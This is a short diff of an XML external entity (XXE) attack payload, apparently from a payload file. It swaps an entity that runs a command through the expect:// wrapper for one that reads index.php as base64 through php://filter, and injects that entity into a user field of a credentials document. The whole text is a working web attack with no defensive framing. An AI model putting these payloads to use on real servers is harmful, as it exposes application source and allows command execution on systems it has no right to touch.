@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "expect://id" >]>
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]>
 <creds>
 <user>&xxe;</user>
 <pass>mypass</pass>
